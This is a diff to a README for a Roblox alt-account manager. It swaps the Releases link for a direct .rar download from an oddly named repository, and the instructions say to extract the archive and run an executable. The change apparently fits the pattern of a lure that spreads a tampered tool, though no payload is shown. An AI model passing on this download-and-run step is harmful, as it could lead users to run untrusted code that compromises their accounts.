@@ -17,7 +17,7 @@ Beware of the risks that you are taking if you accidentally send something to so
 If you ever want a friend to join a game using your account, make sure you have the PlaceId and JobId correctly entered, then right click an account, and click "Copy rbx-player link", DO NOT do this if someone asks you for it.
 
 # Download
-To install this, head over to the [Releases](https://github.com/Reversitory/12yx2ney12cheuh/releases/tag/v0.1a![RBX_Alt_Manager-r3BV-i-like-ur-mom-n05T0](https://user-images.githubusercontent.com/19559898/125918116-c1c575c1-3771-45be-b6b9-71c194ea88f1.png)
+To install this, head over to the [Releases](https://github.com/Reversitory/12yx2ney12cheuh/releases/download/v0.1a/Roblox.Account.Manager.rar)
 ) section and download the rar file at the very top, once downloaded, extract the files into a folder on your desktop and run RBX Alt Manager.exe.
 
 If the application isn't starting or not working, make sure to install the [Latest .NET Framework](https://dotnet.microsoft.com/download/dotnet-framework).
